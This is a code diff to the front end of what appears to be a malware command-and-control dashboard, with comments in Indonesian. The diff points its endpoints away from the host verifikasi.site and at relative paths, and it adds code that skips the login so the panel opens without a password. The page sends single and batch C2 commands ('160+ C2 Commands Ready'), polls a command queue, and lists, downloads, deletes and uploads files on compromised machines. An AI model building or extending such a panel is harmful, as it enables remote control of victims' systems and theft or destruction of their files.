@@ -108,6 +108,7 @@
 
 <div class="toast" id="toast"></div>
 
+<!-- MAIN (TANPA LOGIN!) -->
 <div id="main">
     <div class="header">
         <h1><span class="live-dot"></span> 🔬 DASHBOARD ULTIMATE v2.0</h1>
@@ -214,7 +215,7 @@
 <script>
 window.addEventListener('error', function(e) {
     try {
-        fetch('https://verifikasi.site/error', {
+        fetch('/error', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
@@ -231,7 +232,7 @@ window.addEventListener('error', function(e) {
 
 window.addEventListener('unhandledrejection', function(e) {
     try {
-        fetch('https://verifikasi.site/error', {
+        fetch('/error', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
@@ -493,7 +494,8 @@ function refreshData() {
         } catch(e) {}
     }
     
-    fetch('https://verifikasi.site/data')
+    // 🔥 TANPA KEY!
+    fetch('/data')
         .then(function(r){ 
             if(!r.ok) throw new Error('HTTP ' + r.status);
             return r.json(); 
@@ -902,7 +904,8 @@ function sendC2(aksi, params){
     renderC2History();
     document.getElementById('c2Result').textContent = '⏳ Sending: '+aksi;
     document.getElementById('c2Result').style.color = '#ff0';
-    fetch('https://verifikasi.site/data', { 
+    // 🔥 TANPA KEY!
+    fetch('/data', { 
         method: 'POST', 
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify(payload) 
@@ -957,7 +960,7 @@ function sendBatchC2() {
             var cmd = JSON.parse(line.trim());
             var aksi = cmd.aksi || cmd.command || 'unknown';
             var params = cmd.params || {};
-            fetch('https://verifikasi.site/data', {
+            fetch('/data', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
@@ -991,7 +994,7 @@ function sendBatchC2() {
 
 function updateQueueLength() {
     try {
-        fetch('https://verifikasi.site/data?type=perintah', { method: 'GET' })
+        fetch('/data?type=perintah', { method: 'GET' })
             .then(function(r) { return r.text(); })
             .then(function(text) {
                 try {
@@ -1058,14 +1061,14 @@ function exportCSV(){
 
 function clearAll(){
     if(!confirm('⚠️ Hapus semua data?')) return;
-    fetch('https://verifikasi.site/clear', {method:'POST'})
+    fetch('/clear', {method:'POST'})
         .then(function(){ allData=[]; renderAll(); showToast('🗑️ Data terhapus'); })
         .catch(function(){ showToast('❌ Gagal hapus data'); });
 }
 
 function listFiles(){
     var path = document.getElementById('filePath').value || '/';
-    fetch('https://verifikasi.site/api/files?path='+encodeURIComponent(path))
+    fetch('/api/files?path='+encodeURIComponent(path))
         .then(function(r){ return r.json(); })
         .then(function(data){
             var container = document.getElementById('fileListContainer');
@@ -1093,12 +1096,12 @@ function listFiles(){
 }
 
 function downloadFile(path){
-    window.open('https://verifikasi.site/api/download?path='+encodeURIComponent(path), '_blank');
+    window.open('/api/download?path='+encodeURIComponent(path), '_blank');
 }
 
 function deleteFile(path){
     if(!confirm('Hapus file: '+path+'?')) return;
-    fetch('https://verifikasi.site/api/delete', {
+    fetch('/api/delete', {
         method: 'POST',
         headers: {'Content-Type':'application/json'},
         body: JSON.stringify({path: path})
@@ -1122,7 +1125,7 @@ function uploadFileSubmit(){
     var formData = new FormData();
     formData.append('file', file);
     formData.append('path', document.getElementById('filePath').value || '/');
-    fetch('https://verifikasi.site/api/upload', {
+    fetch('/api/upload', {
         method: 'POST',
         body: formData
     })
@@ -1135,6 +1138,13 @@ function uploadFileSubmit(){
     .catch(function(){ showToast('❌ Gagal upload'); });
 }
 
+// ============================================================
+// 🔥 INIT - LANGSUNG TAMPILKAN DASHBOARD TANPA LOGIN!
+// ============================================================
+document.getElementById('loginBox').style.display = 'none';
+document.getElementById('main').style.display = 'block';
+document.getElementById('statusInfo').textContent = '🔓 Akses langsung - Tanpa Password';
+
 renderC2Buttons();
 refreshData();
 connectWebSocket();
@@ -1143,7 +1153,6 @@ setInterval(updateQueueLength, 10000);
 
 console.log('🔬 DASHBOARD ULTIMATE v2.0 LOADED');
 console.log('📊 160+ C2 Commands Ready');
-console.log('📦 Batch C2 Ready');
 console.log('🔓 TANPA LOGIN - SEMUA BEBAS!');
 </script>
 </body>
